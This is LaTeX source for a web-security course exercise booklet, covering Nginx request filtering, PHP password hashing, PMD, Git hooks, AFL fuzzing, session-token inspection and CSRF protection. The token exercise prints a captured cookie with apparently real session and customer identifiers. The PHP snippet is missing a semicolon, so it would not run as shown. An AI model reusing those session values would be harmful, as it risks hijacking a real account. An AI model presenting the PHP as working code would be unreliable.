{\bf Discussion:}\\
I commonly recommend tools like Packetbeat and other tools from Elastic to process logs, see \link{https://www.elastic.co/beats/packetbeat}

Another popular one is Matomo formerly known as Piwik\\
\link{https://matomo.org/}.


\chapter{Nginx filtering 40 min}
\label{ex:nginx-filtering}

{\bf Objective:}\\
See how Nginx can filter a request easily.


{\bf Purpose:}\\
Running Nginx with a filtering configuration can protect some resource, or part of a web site from attacks.

Example configuration:
\begin{minted}[fontsize=\footnotesize]{shell}
server {
    listen       80;
    server_name  service.dev;
    access_log   /var/log/nginx/access.log;
    error_log    /var/log/nginx/error.log debug;
    # Proxy settings
    proxy_set_header   Host $http_host;
    proxy_redirect     off;
    location / {
        # Catch all
        proxy_pass     http://127.0.0.1:81/;
    }
    location /admin/ {
        # /admin/ only
        allow 192.168.5.0/24;
        deny  all;
        proxy_pass     http://127.0.0.1:81/;
    }
}
\end{minted}

Note; this does a proxy pass to another service locally, you may need to change it. Perhaps you can use the JuiceShop example running on port 3000.

As a directory to disallow, perhaps the \verb+/ftp/+ one.

{\bf Suggested method:}\\
Run the configuration from your Debian Linux VM


{\bf Hints:}\\
My kramse-labs also includes some example configs, check with \verb+git pull+

Having a negative list is bad, better to have a positive list of allowed requests.

{\bf Solution:}\\
When you have tried above and seen Nginx block your request, you are done.

{\bf Discussion:}\\
Multiple modules exist for Nginx, Apache, PHP etc. for blocking bad requests.
Which one is right for your setup, you must research for yourselves.



\chapter{Github secure open source software 15 min}
\label{ex:github-scanning}

\hlkimage{8cm}{software.pdf}

{\bf Objective:}\\
Download the article from Github describing security features available on their platform.


{\bf Purpose:}\\
Running scanners, dependency checking etc. will allow you to analyse the security of your projects.



{\bf Suggested method:}\\
Download and read parts of the article, available as PDF in Fronter, and available at:\\
\url{https://resources.github.com/whitepapers/How-GitHub-secures-open-source-software/}

{\bf Hints:}\\
All languages in use have tools available for helping improve security, in the old days they were called linters after the lint software\\
\url{https://en.wikipedia.org/wiki/Lint_(software)}

{\bf Solution:}\\
When you have downloaded the article and read the first few paragraphs you are done.

Save it for later, as reading it all now will take a long time. Keep it in mind when doing your own projects later.

{\bf Discussion:}\\
There are many scanners for software, docker, platforms, languages etc. Finding the right ones can be hard, and costly. The ones mentioned and used in Github are a nice \emph{bundle} to get started.




\chapter{PHP Passwords 15 min}
\label{ex:php-passwords}

\begin{minted}[fontsize=\footnotesize]{php}
<?php
/**
 * We just want to hash our password using the current DEFAULT algorithm.
 * This is presently BCRYPT, and will produce a 60 character result.
 *
 * Beware that DEFAULT may change over time, so you would want to prepare
 * By allowing your storage to expand past 60 characters (255 would be good)
 */
echo "Password: henrik42"
echo password_hash("henrik42", PASSWORD_DEFAULT);
?>
\end{minted}

{\bf Objective:}\\
Try the PHP function \verb+password_hash+ on the same password with different algorithms and compare hashes


{\bf Purpose:}\\
Running the PHP \verb+password_hash+ function will enable you to use a quality implementation of hashing algorithms.


{\bf Suggested method:}\\
Run the program from your Kali Linux VM, using the documentation\\
\link{https://www.php.net/manual/en/function.password-hash.php}


{\bf Hints:}\\
Create a program that hash a password using multiple algorithms.

You can ask the user for input, or hard-code in the program source.

The output is expected similar to:

\begin{alltt}
$ php my_passwordprogram.php
The password is: henrik42
The password hash using default is: $2y$10$.fwefw...2kljhfwe
... print all of the hashes possible
\end{alltt}


{\bf Solution:}\\
When you have a PHP program that can hash a password you are done.

{\bf Discussion:}\\
There are multiple tunable parameters for some algorithms. Feel free to experiment with them and compare output.

Note the length of output from the hashing algoritms do NOT say how strong they are. An algorithm which output less can be more secure than one with longer output.

Password hashing is not easy, and consider an environment with 100s of applications!


\chapter{Create an Architecture Drawing 45 min}
\label{ex:architecture-drawing}

\begin{quote}
  “A goal without a plan is just a wish.”\\
  - Antoine de Saint-Exupéry
\end{quote}


{\bf Objective:}\\
Try to create an architecture, before coding.

{\bf Purpose:}\\
Having a good design can reduce the vulnerabilities later. Selecting technologies make a huge difference later.


{\bf Suggested method:}\\
Use the architecture from the Juice Shop to start creating your own architecture for the exam project.

The inspiration:
\hlkimage{14cm}{juice-shop-architecture-diagram.png}
Source: \link{https://pwning.owasp-juice.shop/introduction/img/architecture-diagram.png}

{\bf Hints:}\\
Write down alternatives, before selecting something specific.

Write both purpose and technology. JuiceShop example mostly show the logos of their selected technologies. They have a written description too! \link{https://pwning.owasp-juice.shop/introduction/architecture.html}

I would suggest having a similar description/section on your report later.

{\bf Solution:}\\
When you have a rough drawing on paper, you are "done" with the exercise, and hopefully on you way to having some architecture ideas.

{\bf Discussion:}\\
As you know, the JuiceShop application has a number of vulnerabilities -- so the selected technologies \emph{can} be abused. We will neither recommend or warn against using the same technologies in your projects.

The authors have been very deliberate in creating these vulnerabilities.




\chapter{Trying PMD static analysis 30 min}
\label{ex:pmd-static}

{\bf Objective:}\\
Try the program PMD locally on your workstation


{\bf Purpose:}\\
Running PMD will allow you to use static analysis for code.

{\bf Suggested method:}\\
Run the program from your Debian Linux VM, this tool is free and easy to get running. It uses Java, so if you like run it on your Windows or Mac instead.

Follow instructions from the Getting Started\\
\url{https://pmd.github.io/pmd-6.43.0/pmd_userdocs_installation.html}

\begin{alltt}\footnotesize
$ sudo apt install openjdk-17-jre
$ cd $HOME
$ wget https://github.com/pmd/pmd/releases/download/pmd_releases/6.43.0/pmd-bin-6.43.0.zip
$ unzip pmd-bin-6.43.0.zip
$ alias pmd="$HOME/pmd-bin-6.43.0/bin/run.sh pmd"
$
\end{alltt}

Note: this only creates the alias \verb+pmd+ for this session. To make this more permanent, you could add this to a profile like \verb+.bashrc+

Next get some source code and run PMD:
\begin{alltt}\footnotesize
$ git clone --branch rel/2.17.2 https://gitbox.apache.org/repos/asf/logging-log4j2.git
... downloads the source code for log4j
$ pmd -d logging-log4j2 -R rulesets/java/quickstart.xml -f text
\end{alltt}


{\bf Hints:}\\
PMD uses Java, so there should be a JDK/JRE on the system, I install the one from OpenJDK above.

{\bf Solution:}\\
When you have gotten a run of PMD going, you are done.

{\bf Discussion:}\\
Doing the above outputs more than 4500 lines from the PMD program!

How would you proceed?

There seem to be some tedious, but easy to fix, like \emph{Unused import} -- importing some library which is not really used. Things like \emph{empty method}, \emph{empty catch block} etc. may be source missing.

First time use of a new tool will probably find a LOT.

If you are using Maven you could also use their reporting\\
\link{https://maven.apache.org/plugins/maven-pmd-plugin/project-reports.html}
%If you like also check out this OWASP document about JSP and Java\\
%\link{https://owasp.org/www-chapter-belgium/assets/2013/2013-06-06/Securing_Development_with_PMD_-_Teaching_an_Old_Dog_New_Tricks_-_OWASP.pdf}




\chapter{Git hook 30 min}
\label{ex:git-hook}

{\bf Objective:}\\
Try using a Git hook locally on your workstation, to prevent something.


{\bf Purpose:}\\
Running Git with hooks will allow you to perform actions when adding source code. For security we can prevent you from adding something to the source tree which breaks policies we agreed.

First read the documentation:\\
\link{https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks}


Note: today we only use client side hooks, for better security we should add hooks on the server side.

Using our existing repository:
\begin{alltt}\footnotesize
user@Projects:tt$ {\bf git clone https://github.com/kramse/kramse-labs.git}
Cloning into 'kramse-labs'...
user@Projects:tt$ {\bf cd kramse-labs/}
user@Projects:kramse-labs$ {\bf cd .git/hooks}
user@Projects:kramse-labs/.git/hooks$ {\bf cat pre-commit.sample}
// Look at this file, and activate it using:
user@Projects:kramse-labs/.git/hooks$ {\bf cp pre-commit.sample pre-commit}
\end{alltt}

Back in the repository try adding a new file with bad name:

\begin{alltt}\footnotesize
user@Projects:kramse-labs$ {\bf }
user@Projects:kramse-labs$ touch henrikÆØÅ
user@Projects:kramse-labs$ git add henrikÆØÅ
user@Projects:kramse-labs$ git commit -m "Adding henrikÆØÅ"
Error: Attempt to add a non-ASCII file name.
This can cause problems if you want to work with people on other platforms.
To be portable it is advisable to rename the file.

If you know what you are doing you can disable this check using:
  git config hooks.allow
\end{alltt}



{\bf Suggested method:}\\
Run the program Git from your Debian Linux VM


{\bf Hints:}\\
Many hooks will depend on the language and what your policy states. Some hooks will be easy to implement, others will require others to agree. Think tabs vs spaces which will forever stay unresolved.

{\bf Solution:}\\
When you have tried adding a file with a bad name, and gotten an error, you are done. Feel free to experiment more with the hook.

{\bf Discussion:}\\
Many examples can be found on the internet.

Example links:
\begin{list2}
\item \link{https://blogs.vmware.com/opensource/2020/02/03/git-repo-pre-commit-hooks/} which links to the next one
\item A framework for managing and maintaining multi-language pre-commit hooks.\\
\link{https://pre-commit.com/}
\item Blog showing how to use this framework for checking a Kubernetes file:\\
\link{https://www.magalix.com/blog/how-to-start-left-with-security-using-git-pre-commit-hooks}
\end{list2}




\chapter{Try American fuzzy lop up to 45min}
\label{ex:american-fuzzy-lop}

Try American fuzzy lop from \link{http://lcamtuf.coredump.cx/afl/}

{\bf Objective:}\\
Try a fuzzer. We will use the popular american fuzzy lop named after a breed of rabits.


{\bf Purpose:}
\begin{quote}
American fuzzy lop is a security-oriented fuzzer that employs a novel type of compile-time instrumentation and genetic algorithms to automatically discover clean, interesting test cases that trigger new internal states in the targeted binary. This substantially improves the functional coverage for the fuzzed code. The compact synthesized corpora produced by the tool are also useful for seeding other, more labor- or resource-intensive testing regimes down the road.
\end{quote}
Source: \link{http://lcamtuf.coredump.cx/afl/}

{\bf Suggested method:}\\
Look at the Quick Start Guide and README:\\
\link{http://lcamtuf.coredump.cx/afl/QuickStartGuide.txt}\\
\link{http://lcamtuf.coredump.cx/afl/README.txt}

Follow the tutorial at:\\
\link{http://spencerwuwu-blog.logdown.com/posts/1366733-a-simple-guide-of-afl-fuzzer}

Hint: instead of modifying the bashrc just do a \verb+sudo make install+ to install the afl- programs in the right directories.

{\bf Hints:}\\
Look at the many projects which have been tested by AFL, the \emph{bug-o-rama trophy case} on the web page.

{\bf Solution:}\\
When afl is installed on at least one laptop on the team, you are done.

It may be a bit hard to actually run a fuzzing session, so dont fight it for too long.

{\bf Discussion:}\\
For how long is it reasonable to fuzz a program? A few days - sure. Maybe run multiple sessions in parallel!




\chapter{Identify Session Tokens 20 min}
\label{ex:identify-tokens}

\begin{alltt}\small
Cookie: login=CustomerId=900180&LanguageId=9; OldBrowser=%220%22; Pool=rosalina;
ShowNativeLogin=true; DebugCustomerId=900180; DebugPersonId=400954;
OnboardingCompletedFeatures=h=1c744782963a2478d5db92a9981d401a&ofc_47=True&ofd_49=True;
ASP.NET_SessionId=u0245fara4x3qmkli5refddg;...
\end{alltt}

{\bf Objective:}\\
Look at a real application and identify session tokens.

Verify session settings, like Anti-XSS and Anti-CSRF tokens, if present.

Note: First, look for session tokens, later we may repeat this exercise, with focus on CSRF tokens.

{\bf Purpose:}\\
Web applications are \emph{faking sessions}, each request are independent by design of the protocol. This is done using session cookies and similar methods.

Running Burp while performing a login will allow you to look into session identifiers.

Running a test using Mozilla Observatory first will allow you to analyse the settings for the web site.

Some things to look for
\begin{list2}
\item Cookie settings, Secure Flag and http-only
\item HSTS header \url{https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security}
\item Random -- how to check that?
\end{list2}

If you will be checking multiple sites, I can recommend installing the command line version of Mozilla Observatory
\begin{alltt}\footnotesize
└─$ observatory --format report kea-fronter.itslearning.com                 1 ⨯
observatory [WARN] retrying in 1 second (attempt 1/10)
...
observatory [WARN] retrying in 1 second (attempt 6/10)

HTTP Observatory Report: kea-fronter.itslearning.com

Score Rule                     Description
  -20 content-security-policy  Content Security Policy (CSP) implemented unsafely.
   -5 cookies                  Cookies set without using the Secure flag,
                               but transmission over HTTP prevented by HSTS.
   -5 referrer-policy          Referrer-Policy header set unsafely to "origin",
                               "origin-when-cross-origin", or "unsafe-url".
    5 x-frame-options          X-Frame-Options (XFO) implemented via the CSP frame-ancestors directive.

Score: 70
Grade: B

Full Report Url: https://observatory.mozilla.org/analyze.html?host=kea-fronter.itslearning.com
\end{alltt}

We referenced further scanners in exercise \nameref{ex:web-site-check}
on page \pageref{ex:web-site-check}.

{\bf Suggested method:}\\
Run the Burp program from your Kali Linux VM and login to a site like Fronter.

\link{https://kea-fronter.itslearning.com/}


{\bf Hints:}\\
Look in the header section, and look for \verb+Cookie:+. Common ones are \verb+ASP.NET_SessionId+ or \verb+PHPSESSID+

{\bf Solution:}\\
When you have identified session cookies and checked the settings using a scanner, test web site or similar you are done. It is recommended though to dive a bit into the application and how these are used.

{\bf Discussion:}\\
Most sites today have switched to using HTTPS, but some are not according to best practice. To prevent the use of credentials or cookies over insecure connections, we should not allow calls to happen over HTTP.

Various tools like OWASP Zap and Burp suite can also be used for analyzing the session cookies, for randomness/entropy:\\
\link{https://portswigger.net/burp/documentation/desktop/tools/sequencer/getting-started}


Checkout the story of the old extension Firesheep on wikipedia, what could happen when session cookies were not protected:\\
\link{https://en.wikipedia.org/wiki/Firesheep}



\chapter{Research XSS and CSRF protection for your projects 30 min}
\label{ex:research-middleware-csrf}

{\bf Objective:}\\
Research a few options for your own use.


{\bf Purpose:}\\
Creating anti-CSRF tokens are best left to existing middleware.

{\bf Suggested method:}\\
Check your programming language of choice and check if there are frameworks which already include CSRF tokens.


{\bf Hints:}\\
Django has a LOT of security features built-in and is a good example.

{\bf Solution:}\\
When you have checked either one you found yourself, or read the Django description on \link{https://docs.djangoproject.com/en/4.0/ref/csrf/} you are done.

{\bf Discussion:}\\
I have asked you NOT to use a full framework for your project!

You are welcome to create a minimal CSRF protection in your project, and list any shortcomings your implementation may have.


\chapter{Optional: Run parts of a Django tutorial 30min}
\label{ex:django-intro}

{\bf Objective:}\\
Talk about web applications, how they are made.

{\bf Purpose:}\\
Know how you can get started using a framework, like Django\\ \link{https://www.djangoproject.com/}

{\bf Suggested method:}\\
We will visit a Django tutorial and talk about the benefits from using existing frameworks.

{\bf Hints:}\\
Input validation is a problem most applications face. Using Django a lot of functionality is available for input validation.

Take a look at Form and field validation:\\
\link{https://docs.djangoproject.com/en/4.0/ref/forms/validation/}

You can also write your own validators, and should centralize validation in your own applications.

\begin{minted}[fontsize=\small]{python}

  from django.core.exceptions import ValidationError
  from django.utils.translation import gettext_lazy as _

  def validate_even(value):
      if value % 2 != 0:
          raise ValidationError(
              _('%(value)s is not an even number'),
              params={'value': value},
          )
\end{minted}

Example from:
\link{https://docs.djangoproject.com/en/4.0/ref/validators/}

{\bf Solution:}\\
When we have covered basics of what Django is, what frameworks provide and seen examples, we are done.

{\bf Discussion:}\\
Django is only an example, other languages and projects exist.

Django includes a LOT already built-in, including security features.



\end{document}



\chapter{ xx min}
\label{ex:}

{\bf Objective:}\\
Try the program XX locally on your workstation


{\bf Purpose:}\\
Running XXX will allow you to analyse


\begin{alltt}


\end{alltt}


{\bf Suggested method:}\\
Run the program from your Kali Linux VM


{\bf Hints:}\\


{\bf Solution:}\\
When you have

{\bf Discussion:}\\
